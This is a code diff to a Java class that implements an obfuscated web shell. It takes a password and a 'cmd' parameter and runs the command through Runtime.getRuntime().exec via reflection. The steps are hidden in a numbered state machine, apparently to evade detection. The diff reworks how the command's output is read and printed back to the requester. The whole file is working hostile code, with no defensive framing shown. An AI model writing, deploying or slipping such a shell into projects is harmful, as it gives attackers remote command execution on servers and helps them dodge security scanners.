@@ -8,7 +8,7 @@ import java.lang.reflect.Method;
 public class Base {
     public static void main(String[] args) {
         try {
-            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11", "pwd", "cmd", "java.lang.Runtime",
+            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13", "pwd", "cmd", "java.lang.Runtime",
                     "getRuntime", "exec", "<pre>", "</pre>"};
             String temp = globalArr[0];
             String[] b = temp.split("\\|");
@@ -20,6 +20,9 @@ public class Base {
             java.lang.reflect.Method ex = null;
             Process process = null;
             java.io.InputStream in = null;
+            java.io.InputStreamReader resulutReader = null;
+            java.io.BufferedReader stdInput = null;
+
             byte bytes[] = null;
             while (true) {
                 int op = Integer.parseInt(b[index++]);
@@ -57,11 +60,17 @@ public class Base {
                         out.print(globalArr[6]);
                         break;
                     case 10:
-                        while ((in.read(bytes)) != -1) {
-                            out.println(new String(bytes));
-                        }
+                        resulutReader = new java.io.InputStreamReader(in);
                         break;
                     case 11:
+                         stdInput = new java.io.BufferedReader(resulutReader);
+                    case 12:
+                        String s = null;
+                        while ((s = stdInput.readLine()) != null) {
+                            out.println(s);
+                        }
+                        break;
+                    case 13:
                         out.print(globalArr[7]);
                         break;
                 }
